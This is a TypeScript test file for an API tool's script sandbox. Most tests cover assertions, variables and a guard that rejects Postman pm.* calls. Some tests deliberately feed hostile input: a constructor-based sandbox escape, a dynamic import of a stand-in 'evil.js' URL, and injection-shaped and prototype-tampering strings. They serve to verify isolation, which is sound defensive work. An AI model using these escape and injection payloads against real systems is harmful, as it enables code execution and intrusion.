import { describe, expect, it } from "vitest";
import { executeScript, type ScriptContext } from "./sandbox";

const ctx: ScriptContext = {
  phase: "post",
  vars: { existing: "1" },
  data: { userId: "7" },
  env: { baseUrl: "https://api.test", userId: "env-user" },
  iteration: 0,
  caseName: "Get user",
  request: { method: "GET", url: "https://api.test/users/7", headers: [] },
  response: {
    status: 200,
    statusText: "OK",
    headers: [["Content-Type", "application/json"]],
    body: '{"id":7,"token":"t-1","roles":["admin"]}',
    durationMs: 50,
    sizeBytes: 40,
  },
};

describe("executeScript", () => {
  it("records passing and failing tests with messages", async () => {
    const out = await executeScript(
      `rr.test("status 200", () => rr.expect(rr.response.status).toBe(200));
       rr.test("is admin", () => rr.expect(rr.response.json().roles).toContain("admin"));
       rr.test("wrong id", () => rr.expect(rr.response.json().id).toBe(8));
       rr.test("not empty", () => rr.expect(rr.response.body).not.toBe(""));`,
      ctx,
    );
    expect(out.error).toBeUndefined();
    expect(out.tests.map((t) => t.passed)).toEqual([true, true, false, true]);
    expect(out.tests[2].error).toBe("Expected 7 to be 8");
  });

  it("sets and reads variables with run vars over CSV over environment", async () => {
    const out = await executeScript(
      `rr.vars.set("token", rr.response.json().token);
       rr.vars.set("count", 3);
       rr.vars.unset("existing");
       rr.log("user", rr.vars.get("userId"), rr.vars.get("baseUrl"));`,
      ctx,
    );
    expect(out.vars).toEqual({ token: "t-1", count: "3" });
    expect(out.logs).toEqual(["user 7 https://api.test"]);
  });

  it("does not change the context it was given", async () => {
    await executeScript(`rr.vars.set("x", "y")`, ctx);
    expect(ctx.vars).toEqual({ existing: "1" });
  });

  it("reports a thrown error and keeps tests recorded before it", async () => {
    const out = await executeScript(`rr.test("first", () => {}); undefinedThing.call();`, ctx);
    expect(out.tests).toHaveLength(1);
    expect(out.error).toMatch(/ReferenceError/);
  });

  it("reports a syntax error", async () => {
    expect((await executeScript(`rr.test("x", () => {`, ctx)).error).toMatch(/SyntaxError/);
  });

  it("captures console.log and reads headers by any case", async () => {
    const out = await executeScript(`console.log(rr.response.header("content-type"), {a: 1})`, ctx);
    expect(out.logs).toEqual(['application/json {"a":1}']);
  });

  it("treats an async test as a failure", async () => {
    const out = await executeScript(`rr.test("later", async () => {})`, ctx);
    expect(out.tests[0]).toMatchObject({ passed: false, error: "rr.test functions cannot be async" });
  });

  it("fails a test whose second argument is not a function, with a clear message", async () => {
    const out = await executeScript(`rr.test("bool", rr.response.status === 200)`, ctx);
    expect(out.tests[0]).toMatchObject({ passed: false });
    expect(out.tests[0].error).toMatch(/needs a function/);
  });
});

describe("executeScript Postman guard", () => {
  it("refuses a script that still uses pm.* and runs nothing", async () => {
    const out = await executeScript(`console.log("before"); pm.test("a", () => {}); pm.sendRequest("u");`, ctx);
    expect(out.error).toMatch(/still uses Postman pm\.\* calls \(pm\.test, pm\.sendRequest\)/);
    expect(out.error).toMatch(/Scripts tab/);
    expect(out.logs).toEqual([]);
    expect(out.tests).toEqual([]);
  });

  it("does not trip on pm in comments or strings", async () => {
    const out = await executeScript(`// pm.test("a")\nrr.log("pm.response.json()");`, ctx);
    expect(out.error).toBeUndefined();
    expect(out.logs).toEqual(["pm.response.json()"]);
  });
});




  it("does not expose host capabilities or constructor escapes", async () => {
    const out = await executeScript(`
      for (const name of ["fetch", "XMLHttpRequest", "WebSocket", "importScripts", "indexedDB", "Worker", "__TAURI_INTERNALS__"]) {
        rr.test(name, () => rr.expect(typeof globalThis[name]).toBe("undefined"));
      }
      rr.test("constructor", () => rr.expect(typeof ({}).constructor.constructor("return globalThis")().fetch).toBe("undefined"));
      import("https://example.com/evil.js").catch(() => {});
    `, ctx);
    expect(out.error).toBeUndefined();
    expect(out.tests).toHaveLength(8);
    expect(out.tests.every(t => t.passed)).toBe(true);
  });

  it("starts with fresh globals and prototypes", async () => {
    await executeScript(`globalThis.marker = 123; Object.prototype.marker = 123;`, ctx);
    const out = await executeScript(`rr.test("fresh", () => rr.expect(globalThis.marker).toBeUndefined()); rr.test("prototype", () => rr.expect(({}).marker).toBeUndefined());`, ctx);
    expect(out.tests.every(t => t.passed)).toBe(true);
  });

  it("interrupts loops and bounds output", async () => {
    const loop = await executeScript(`while (true) {}`, ctx, 100);
    expect(loop.error).toBeTruthy();
    const output = await executeScript(`rr.log("x".repeat(1100000));`, ctx, 1000);
    expect(output.error).toMatch(/limit/);
    expect(output.logs).toEqual([]);
  });

it("rejects tampered serialization and preserves special variable keys", async () => {
  const bad = await executeScript(`Object.prototype.toJSON = () => null`, ctx);
  expect(bad.error).toMatch(/invalid output/);
  const special = { ...ctx, vars: JSON.parse('{"__proto__":"value"}') };
  const out = await executeScript(`rr.log(rr.vars.get("__proto__"))`, special);
  expect(out.logs).toEqual(["value"]);
});

describe("executeScript treats script source as data", () => {
  const run = (code: string, c: ScriptContext = ctx) => executeScript(code, c);

  it("runs sources containing quotes, backslashes, comment terminators, backticks, template markers and script tags", async () => {
    const out = await run(
      "const a = \"\\\"'\\\\\"; /* */ const b = `${1 + 1}`; const c = '</script>'; const d = '*/'; rr.log(a, b, c, d); // \"); throw 1; (\"",
    );
    expect(out.error).toBeUndefined();
    expect(out.logs).toEqual(["\"'\\ 2 </script> */"]);
  });

  it("runs sources containing raw U+2028 and U+2029", async () => {
    const out = await run("const s = '  '.length; rr.log(s);\nrr.log(' '.charCodeAt(0), ' '.charCodeAt(0));");
    expect(out.error).toBeUndefined();
    expect(out.logs).toEqual(["2", "8232 8233"]);
  });

  it("does not let an injection-shaped script break out of its own evaluation", async () => {
    const out = await run("'); globalThis.pwned = 1; ('");
    expect(out.error).toBeUndefined();
    const check = await run("rr.log(typeof globalThis.pwned)");
    expect(check.logs).toEqual(["undefined"]);
  });

  it("passes hostile context values through as data", async () => {
    const hostile = "\"); throw new Error('x'); (\"` ${1} \\     </script> */";
    const out = await run("rr.log(rr.vars.get('v'))", { ...ctx, vars: { v: hostile } });
    expect(out.error).toBeUndefined();
    expect(out.logs).toEqual([hostile]);
  });

  it("handles very long script and context strings", async () => {
    const big = "x".repeat(500_000);
    const out = await run(`const s = "${"a".repeat(200_000)}"; rr.log(s.length, rr.vars.get('big').length);`, { ...ctx, vars: { big } });
    expect(out.error).toBeUndefined();
    expect(out.logs).toEqual(["200000 500000"]);
  });
});
